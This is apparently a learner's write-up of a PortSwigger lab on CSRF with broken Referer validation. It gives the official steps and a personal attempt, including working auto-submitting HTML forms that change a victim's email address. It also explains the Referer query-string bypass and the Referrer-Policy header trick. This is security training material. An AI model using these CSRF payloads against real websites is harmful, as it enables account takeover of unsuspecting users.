# CSRF with broken Referer validation

## This lab's email change functionality is vulnerable to CSRF. It attempts to detect and block cross domain requests, but the detection mechanism can be bypassed.

## To solve the lab, use your exploit server to host an HTML page that uses a [CSRF attack](https://portswigger.net/web-security/csrf) to change the viewer's email address.

## You can log in to your own account using the following credentials: `wiener:peter`

### HINT:

```html
<script>
  history.pushState("", "", "/");
</script>
<form
  action="https://0a05009904830764825ebf6c00de0053.web-security-academy.net/my-account/change-email"
  method="POST"
>
  <input type="hidden" name="email" value="foo1@bar.com" />
  <input type="submit" value="Submit request" />
</form>
<script>
  document.forms[0].submit();
</script>
```

1.  Open Burp's browser and log in to your account. Submit the "Update email" form, and find the resulting request in your Proxy history.
2.  Send the request to Burp Repeater. Observe that if you change the domain in the Referer HTTP header, the request is rejected.
3.  Copy the original domain of your lab instance and append it to the Referer header in the form of a query string. The result should look something like this:

    `Referer: https://arbitrary-incorrect-domain.net?YOUR-LAB-ID.web-security-academy.net`

4.  Send the request and observe that it is now accepted. The website seems to accept any Referer header as long as it contains the expected domain somewhere in the string.
5.  Create a CSRF proof of concept exploit as described in the solution to the [CSRF vulnerability with no defenses](https://portswigger.net/web-security/csrf/lab-no-defenses) lab and host it on the exploit server. Edit the JavaScript so that the third argument of the `history.pushState()` function includes a query string with your lab instance URL as follows:

    `history.pushState("", "", "/?YOUR-LAB-ID.web-security-academy.net")`

    This will cause the Referer header in the generated request to contain the URL of the target site in the query string, just like we tested earlier.

6.  If you store the exploit and test it by clicking "View exploit", you may encounter the "invalid Referer header" error again. This is because many browsers now strip the query string from the Referer header by default as a security measure. To override this behavior and ensure that the full URL is included in the request, go back to the exploit server and add the following header to the "Head" section:

    `Referrer-Policy: unsafe-url`

    Note that unlike the normal Referer header, the word "referrer" must be spelled correctly in this case.

7.  Change the email address in your exploit so that it doesn't match your own.
8.  Store the exploit, then click "Deliver to victim" to solve the lab.

---

### step1

login and change email to repeater
`Referer: https://0a1000f20336b572830633df008a0099.web-security-academy.net`
in reference add any url with ? mark and test
`Referer: https://pp.com?0a1000f20336b572830633df008a0099.web-security-academy.net`

```html
<html>
  <body>
    <script>
      history.pushState(
        "",
        "",
        "/?0a1000f20336b572830633df008a0099.web-security-academy.net"
      );
    </script>
    <form
      action="https://0a1000f20336b572830633df008a0099.web-security-academy.net/my-account/change-email"
      method="POST"
    >
      <input type="hidden" name="email" value="fo11@bar.com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```
